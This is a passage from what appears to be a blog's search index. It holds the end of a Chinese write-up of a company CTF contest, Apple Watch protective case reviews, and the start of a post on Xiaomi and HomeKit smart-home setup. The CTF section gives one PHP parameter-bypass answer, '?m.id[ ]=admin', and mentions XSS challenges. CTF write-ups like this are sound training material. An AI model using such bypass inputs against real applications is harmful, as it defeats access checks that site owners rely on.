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從開頭可以知道這是一張圖片的base64壓縮圖，我們把以上編碼直接貼到瀏覽器網址列就能得到解答所在網址，進入網址後即可通關！4.衝出封鎖線題目說明： 這題一打開就是顯示這題的PHP程式，要想辦法用GET參數繞過判斷執行else裡面的setPassedCookie( );方法。解題：本題是一個蠻常用但卻很少人知道的PHP漏洞，詳細介紹如下：ctf中常见的PHP漏洞小结題目有稍微改過，這題的答案是：?m.id[ ]=admin5.滲透的考驗、6.滲透的考驗2這兩題都是入門的基礎XSS題目這邊就不做贅述。這題由於解答我放在前端，這邊使用了一個提供不可逆加密的JS網站： https://www.sojson.com/jsobfuscator.html(雖然我不確定是否為真？反正有辦法破解的話也就當他通過吧！)7.月光寶盒這題是從解謎APP拉出來的題目，這邊也不做展示。總結比賽系統大約花一週時間建置，題目大約花了三個月慢慢慢湊齊（要有靈感）；比賽也已圓滿落幕，得到的反饋都還不錯～「有趣好玩」；這也是我的初心，希望大家以有趣為出發點去探索、腦力激盪；所以不管是題目名稱（都很電影）、題目方向，都不會有太深入工程、計算的東西，這樣就太死不有趣了！另外，這邊附上題目回答率，當做難易度參考：當初在出題的時候最怕的就是題目太簡單大家很快就解完或題目太難大家都卡關，兩種狀況都很尷尬。以上題目實際比賽結果（比賽時間：90分鐘）符合我們的期望，剛剛好！不會太難獲太簡單，第一名的組別解了9題，即使是最後一名的組別也解了7題；非常接近，但因為有時間分數、購買提示的因素，所以最後還是分得出高下！ 比較意外的是通往魔法學院的大門…居然沒人解出來QQ以上就是這次舉辦工程CTF大賽的總整理Addcn 2019 CTF延伸閱讀 揭露一個幾年前發現的巧妙網站漏洞 APP有用HTTPS傳輸，但資料還是被偷了有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 4,839 Total Views Last Statistics Date: 2025-01-19 | 4,714 Views on Medium. " }, { "title": "Apple Watch 保護殼開箱體驗 (Catalyst & Muvit)", "url": "/posts/a66ce3dc8bb9/", "categories": "ZRealm Life.", "tags": "生活, 開箱, 3c, apple-watch, catalyst", "date": "2019-07-08 22:55:50 +0800", "snippet": "Apple Watch 保護殼開箱體驗 (Catalyst &amp; Muvit)Catalyst Apple Watch 超輕薄防水保護殼 &amp; Muvit Apple Watch 保護套[最新更新] Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往 Apple Watch 原廠不鏽鋼米蘭錶帶開箱&gt;&gt;點我前往 感謝...", "content": "Apple Watch 保護殼開箱體驗 (Catalyst &amp; Muvit)Catalyst Apple Watch 超輕薄防水保護殼 &amp; Muvit Apple Watch 保護套[最新更新] Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往 Apple Watch 原廠不鏽鋼米蘭錶帶開箱&gt;&gt;點我前往 感謝 Men’s Game 玩物誌 提供 Apple Watch Series 4 保護殼試用。身為一個神經大條的強迫症患者，在使用Apple Watch這種精緻的產品非常困擾；因手殘神經大條很容易不小心碰撞到＆加上強迫症有傷痕用起來會很不爽，所以一買來就一直貼滿版保護貼防止意外發生．但其實 只貼滿版保護貼是不夠的，手錶本身是曲面，保護貼邊邊脆弱，很容易因本體邊框不小心擦到造成碎邊 ：無保護殼情況下，滿版保護貼碎邊慘況目前已換第三張滿版保護貼；雖然手錶本身螢幕沒有受傷但心還是很痛，完美貼合＋不影響觸控＋薄＋高透＋不掀邊＝很貴($990/張)，花在保護貼的$都快夠我直升不鏽鋼版了；也因此Apple Watch 的保護殼對我來說就非常重要，可以加強本體邊框的防護，減少碰撞受傷問題．本篇會開箱兩款Apple Watch 保護殼，並針對體驗心得、機能、外型、適用場景分別做出比較，讓我們開始吧！左：Muvit保護套/右：Catalyst保護殼(含錶帶)p.s. 我的手錶型號是：Apple Watch Series 4 (GPS + 行動網路)，44 公釐太空灰色鋁金屬錶殼搭配黑色運動型錶帶Catalyst Apple Watch 超輕薄防水保護殼(含錶帶)這款保護殼是有含錶帶的一體化設計，從佩戴到防撞防水的全方位保護．開箱使用：盒子正面100公尺防水/360°全方位防護/2公尺墜落防摔盒子背面IP-68防水級別，每件產品經水深一百米測試，美國軍規級碰撞保護，可直接操作屏幕，原聲通話品質，可經錶殼直接充電，可經錶殼直接偵測心跳率．IP-68 ( Wiki )：6 - 完全防塵灰塵無法進入，完全防止接觸。8 - 浸入水中超過1m。內容物除了Catalyst Apple Watch保護殼本體(裡面是模型機)並附一支小螺絲起子方便安裝．保護殼(含錶帶)本體保護殼(含錶帶)本體背面與原廠運動錶帶(L)比較(左：Catalyst/右：原廠)固定環卡榫與原廠運動錶帶(L)相比長度差不多但是開孔更密，在配戴上能調整到更適合手腕大小的長度；在固定環上有卡榫能確保激烈運動時不會脫落．安裝：我們要先將Catalyst錶殼拆解開來，再將Apple Watch機體放入後組裝回去． 首先轉開錶背螺絲2. 取下螺絲後，兩手抓著錶帶，使用姆指向外施力將錶殼本體推出．3.將所有部件拆解開來分解圖(取自 官網 )4. 將Apple Watch本體從現有運動錶帶上取下翻到背面用指甲壓上下方長方形卡榫後往左或往右推即可！5. 將Apple Watch機體放入防水套中安裝時請注意防水套要套好，不能有皺摺避免影響防水性．6.套上保護殼上殼ㄧ樣要注意不能有皺摺避免影響防水性．7.放回錶帶本體並鎖上螺絲卡回本體並鎖上螺絲（ 請注意螺絲勿鎖太緊哦！ ）測試： 充電可直接吸附：測試結果：無問題，不影響充電速度。2. 心率：左：有裝殼/右：裸機測試結果：無問題，不影響心率檢測。3. 顯示方面：Apple Watch 4 滿版螢幕無遮蔽，沒問題✅4. Digital Crown可正常使用✅5. 收音影響：無特別差異✅6. 外觀：因本人手粗，手錶本來就買最大的44公釐版本，再套上保護殼後又更顯粗獷大器了．心得：這款錶帶在防護上真正做到了360° 全面保護並加強本身的防水功能以適應更艱困的環境。錶帶一樣採用親膚材質，戴起來與原廠運動錶帶無異，但在錶帶調整的部分由於開孔較密，能調整到更適合的大小（我戴原廠錶帶會卡在往前一格太鬆往後一個太緊的尷尬狀態）還有固定環的卡榫讓我這種強迫症患者更安心了一些！整體外觀狂野粗獷，從事戶外活動、登山、攀岩、潛水時很搭風格，也正是這款錶帶能發會最大保護功效的場景！下次記得帶墨鏡，太陽超大Catalyst 家族合照 ( AirPods保護套 )Muvit Apple Watch 保護套試用的第二款是 Muvit Apple Watch 保護套，相較於Catalyst的專業保護性，這款比較簡潔、便利，適用於各種日常生活場景；雖說如此，Muvit 依然通過美國軍規MIL-STD 810G 3米摔落測試，安全保護不馬乎！開箱使用：盒子正面兩個不同顏色保護套：左-黑色 / 右-淡紫色美國軍規MIL-STD 810G 3米摔落測試、極輕2.3G盒子背面雙層結構保護、矽膠減震層、聚碳酸酯緩衝系統、保護屏幕錶框內容物保護套本體，黑色/淡紫色安裝： 安裝方面非常簡單，ㄧ樣先將Apple Watch本體從現有運動錶帶上取下翻到背面用指甲壓上下方長方形卡榫後往左或往右推即可！2. 將Apple Watch 機體 ”面朝下” 放入保護套中3. 裝回錶帶，完成！完成：黑色款淡紫色款試戴，左：黑色/右：淡紫色測試：Digital Crown：可正常使用✅，其他項目如收音、心率、顯示…等等，此款僅為邊框保護套不受影響，就不特別測試啦！心得：使用這款保護套最滿意的地方就是，我可以方便快速依照生活場景替換對應的錶帶（西裝：皮革錶帶、日常：運動錶帶）拆裝方便，保護性方面足夠應付所有日常場景（做家事、打掃、搬東西）目前日常生活都是使用這款保護套。與皮製錶帶搭配心得總結：從收到試用到撰文完間隔了超過4個月，期間經歷了搬家(Sorry…本篇圖場景凌亂)、參加鐵人兩項（10KM跑步+40KM單車）、馬來西亞潛水；這兩款保護套跟著往上山下海跑跑跳跳，目前滿版保護貼依然完美無缺！還記得我換了幾張保護貼嗎？答案是3張/3個月，平均貼不到一個月就會不知道怎麼的受傷碎邊，一張要$990阿 Orz 只能說相見恨晚，早知道有保護套這種產品就不用多花冤望錢！不論是Catalyst或是Muvit都解決了我貼保護貼一直碎邊的痛點，如果你沒貼保護貼那就更該買個保護套保護螢幕邊角，不然螢幕玻璃碎裂心會更痛選擇方面的建議是，如果你時常從事激烈運動（攀岩、潛水）、勞力工作，建議選用Catalyst，較能放心；如果只是一般上班族、偶爾運動跑跑步、喜歡依照心情換錶帶，那使用 Muvit 就足夠囉！以下整一個簡單的比較表供大家參考：選購： CATALYST FOR APPLE WATCH SERIES 4 44mm超輕薄防水保護殼 MUVIT Apple Watch Series4 (44mm) 耐衝擊保護殼閒聊：從 第一篇完整的開箱 到 使用三個月後 ，算一算手上的 Apple Watch S4 已經戴快一年了；使用上已無太大的變化，第三方APP依然很少，最常用的功能依然是Apple Pay、解鎖MAC、看通知，Apple Watch已然融入到我的日常生活之中，習慣了它的便利． by the way 讓我們一起期待 Watch OS 6 吧 :)這半年更勤於發揮Apple Watch的運動功能，記錄跑步、自行車的時間、路線、心跳，除了紀錄之外；獎章讓你運動更有目標及成就感、與朋友競賽運動量或分享成果到社群都讓運動變成是有趣的事，這樣才更容易保持！獎章,競賽,運動路線,運動狀況 本篇感謝 Men’s Game 玩物誌 提供 Apple Watch Series 4 保護殼試用。延伸閱讀[最新更新] Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往 Apple Watch 原廠不鏽鋼米蘭錶帶開箱&gt;&gt;點我前往手錶都買了，不考慮AirPods 2耳機嗎？請看&gt;&gt; AirPods 2 開箱及上手體驗心得有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 5,225 Total Views Last Statistics Date: 2025-01-19 | 5,223 Views on Medium. " }, { "title": "智慧家居初體驗 - Apple HomeKit & 小米米家", "url": "/posts/c3150cdc85dd/", "categories": "ZRealm Life.", "tags": "生活, 開箱, 3c, 米家, homekit", "date": "2019-07-06 01:13:47 +0800", "snippet": "智慧家居初體驗 - Apple HomeKit &amp; 小米米家米家智慧攝影機及米家智慧檯燈、Homekit設定教學[2020/04/20] 進階篇已發 ： 有經驗的朋友請直接左轉前往&gt;&gt; 示範使用樹莓派當 HomeBridge 主機，將所有米家家電串上 HomeKit雜談：最近剛搬完家；有別於原本住的地方，天花板是辦公室輕鋼架燈，亮到要拔掉幾根燈管眼睛才比較舒適；現在住的地...", "content": "智慧家居初體驗 - Apple HomeKit &amp; 小米米家米家智慧攝影機及米家智慧檯燈、Homekit設定教學[2020/04/20] 進階篇已發 ： 有經驗的朋友請直接左轉前往&gt;&gt; 示範使用樹莓派當 HomeBridge 主機，將所有米家家電串上 HomeKit雜談：最近剛搬完家；有別於原本住的地方，天花板是辦公室輕鋼架燈，亮到要拔掉幾根燈管眼睛才比較舒適；現在住的地方則是裝潢反射燈，使用電腦、看書亮度稍嫌不足，兩週下來眼睛覺得更容易乾澀不舒服；本想直接去IKEA採購，但考量到光色、護眼，最後比較一下CP值，於是還是選擇了小米檯燈(加上之前已有買小米智慧攝影機，都是米家系列產品)。本篇：其實我在選購時並沒有特別注意是否支援Apple HomeKit，身為一個iOS 開發者實在太失格了，因為我壓跟沒想到小米會支援．所以本篇會分別介紹 Apple HomeKit 使用 、 不支援Apple HomeKit的智慧家居怎麼使用第三方串接HomeKit？ 及 使用米家本身搭建智慧家庭的方法（搭配IFTTT）大家可以根據自己的裝置需求跳著看。採買：我一共買了兩盞檯燈，一盞(Pro)放電腦桌工作用、另一盞放床頭當閱讀燈。米家檯燈 Pro ：NT$ 1,795 支援米家、Apple 